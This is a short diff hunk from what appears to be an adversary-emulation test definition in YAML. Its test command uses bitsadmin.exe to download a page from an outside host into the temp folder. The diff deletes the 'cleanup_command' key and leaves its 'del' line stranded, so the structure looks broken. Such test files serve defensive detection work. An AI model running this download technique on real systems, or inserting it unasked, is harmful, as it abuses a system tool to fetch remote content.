@@ -13,7 +13,6 @@ atomic_tests:
     elevation_required: false
     command: |
       bitsadmin.exe /transfer "DownloadedFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
-    cleanup_command: |
       del %TEMP%\bitsadmindownload.html
 
 
